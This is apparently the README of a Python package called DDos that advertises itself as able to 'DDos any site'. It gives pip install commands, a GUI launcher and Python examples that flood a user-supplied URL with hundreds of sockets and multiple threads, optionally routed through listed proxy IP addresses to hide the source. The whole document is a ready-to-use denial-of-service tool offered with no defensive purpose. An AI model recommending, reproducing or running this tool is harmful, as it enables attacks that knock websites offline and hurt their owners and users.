# DDos

DDos any site using python

## Install

### From Pypi

`pip3 install DDos`

### From GitHub

`pip3 install git+https://github.com/donno2048/DDos`

## Usage

### GUI

To use it just run:

```sh
DDos
```

or

```sh
ddos
```

in the terminal to launch the GUI (tkinter is a requirement for the GUI so use: `sudo apt-get update && sudo apt-get install python3-tk -y` on linux and on Windows it's already installed)

### TUI

To use the text-based user interface see this python example:

```py
from DDos import checkUrl, DDos # import the needed functions
while True:
    url = input("Give me a URL: ") # get a url from the user
    if checkUrl(url): break # if it's formatted correctly exit the loop
    else: print("This URL isn't formatted correctly, try again") # else, go back
DDos(url, sockets = 400, threads = 10, use_proxies = True) # ddos this url with 400 sockets and 10 threads and use the built-it proxies
```

or simply:

```py
from DDos import DDos
DDos(input("Give me a URL: ")) # if the url isn't formatted correctly it will have an assertion error, use 500 sockets and 10 threads, no proxies will be used
```

The DDos function has also a `custom_proxies` optional variable and there is a `checkProxy` function, you can use them like so:

```py
from DDos import DDos, checkProxy
assert checkProxy("109.237.91.155:8080")
assert checkProxy("178.128.37.176:80")
DDos(input("Give me a URL: "), use_proxies = True, custom_proxies = ["109.237.91.155:8080", "178.128.37.176:80"])
```

If you give an invalid proxy you will get an assertion error.
